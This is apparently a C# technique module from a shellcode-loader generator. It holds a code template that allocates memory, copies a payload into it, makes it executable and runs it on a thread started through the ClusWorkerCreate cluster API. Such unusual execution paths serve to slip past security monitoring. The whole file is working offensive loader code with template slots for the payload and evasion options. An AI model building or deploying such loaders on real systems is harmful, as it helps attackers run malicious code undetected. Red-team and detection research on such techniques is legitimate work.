using System.Collections.Generic;

namespace SingleDose.Techniques.Loaders
{
    internal class ClusWorkerCreate : ITechnique
    {
        string ITechnique.TechniqueName => "ClusWorkerCreate";

        string ITechnique.TechniqueDescription => null;

        List<string> ITechnique.TechniqueReferences => new List<string>() {
            @"https://github.com/Wra7h/FlavorTown"
        };

        bool ITechnique.IsUnsafe => false;

        bool ITechnique.IsLoader => true;

        List<string> ITechnique.Invokes => new List<string>() { "VirtualAlloc", "ClusWorkerCreate", "ClusWorkerTerminateEx"};

        List<string> ITechnique.Prerequisites => null;
        string ITechnique.Base => @"
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Linq;

namespace {{NAMESPACE}}
{
    class Program
    {
        public static void Main(string[] args)
        {
            {{MODE}}
            {{TRIGGER}}
            IntPtr hAlloc = VirtualAlloc(IntPtr.Zero, (uint)payload.Length, 0x1000 | 0x2000, {{flProtect}});
            Marshal.Copy(payload, 0, hAlloc, payload.Length);
            {{PROTECT}}
            CLUS_WORKER sCW = new CLUS_WORKER();
            ClusWorkerCreate(out sCW, hAlloc, IntPtr.Zero);

            uint INFINITE = 0xffffffff;
            ClusWorkerTerminateEx(ref sCW, INFINITE, true);
        }
        {{ARGS}}
        struct CLUS_WORKER
        {
            public IntPtr hThread;
            public bool Terminate;
        }

        {{INVOKE}}
    }
}";

        string ITechnique.VProtect => @"uint oldProtect;
            VirtualProtectEx(Process.GetCurrentProcess().Handle, hAlloc, payload.Length, 0x20, out oldProtect);";
    }
}
